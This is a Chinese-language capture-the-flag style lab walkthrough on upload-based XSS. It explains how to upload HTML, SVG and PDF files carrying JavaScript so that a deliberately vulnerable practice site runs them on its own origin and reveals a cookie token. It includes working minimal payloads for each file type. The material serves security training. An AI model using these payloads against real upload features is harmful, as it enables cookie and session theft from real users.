思路提示

本关是上传型 XSS——服务器允许上传 HTML、SVG、PDF 文件，且上传后可以在同源直接打开。思路：构造一个带 JS 的 HTML 或 SVG 文件，上传后访问返回的链接，JS 就会在同源下执行，从而读到 document.cookie 里的通关凭证。PDF 也可以（本关 PDF 被故意以 text/html 返回，会执行混排的脚本）。

详细解题过程（点击展开）

练习目标

  • 上传一个带 JS 的 HTML 文件，访问返回的链接后弹出 alert(1)。
  • 用 SVG 文件达到同样效果（注意：必须直接打开文件地址，作为图片引用不会执行）。
  • 用 PDF 文件达到同样效果，并弹出 document.cookie，读出通关凭证。

操作步骤

  1. 先访问本关页面一次：页面会写入演示 Cookie xss_upload_pass（里面就是通关凭证）。
  2. 点页面上的"示例 payload 下载"，或按下面的代码自己造一个文件。
  3. 用上传表单提交文件，页面会给出访问地址 {{BASE}}/modules/xss/view.php?f=文件名。
  4. 在新标签页打开该地址，观察弹窗。若浏览器拦截弹窗，看地址栏右侧的"已拦截弹窗"提示。
  5. payload 换成 alert(document.cookie) 即可看到 恭喜你完成本关挑战！。

三种载体最小 payload

① HTML（upload_xss.html）

<html><body>
<h1>Upload XSS via HTML</h1>
<script>alert('Cookie: ' + document.cookie)</script>
</body></html>

② SVG（upload_xss.svg）

<svg xmlns="http://www.w3.org/2000/svg" width="300" height="120"
     onload="alert('Cookie: ' + document.cookie)">
  <text x="10" y="40">Upload XSS via SVG</text>
  <script>alert('Cookie: ' + document.cookie)</script>
</svg>

③ PDF：用站点提供的示例 PDF 最省事（自带 /OpenAction 与 HTML 混排尾巴）。手工构造要点如下：

%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >> endobj
4 0 obj << /Type /Action /S /JavaScript
  /JS (app.alert\("Upload XSS via PDF"\)) >> endobj
...
%%EOF
<script>alert('Cookie: ' + document.cookie)</script>
提示：本关的 PDF 由 view.php 故意以 text/html 返回（模拟 MIME 配置错误），所以浏览器会执行混排的脚本；同一份文件用 Adobe Reader 打开则走 PDF 内嵌 JavaScript。
注意：如果文件被覆盖或想换 payload，直接在"已上传文件"里点"删除"后重传。
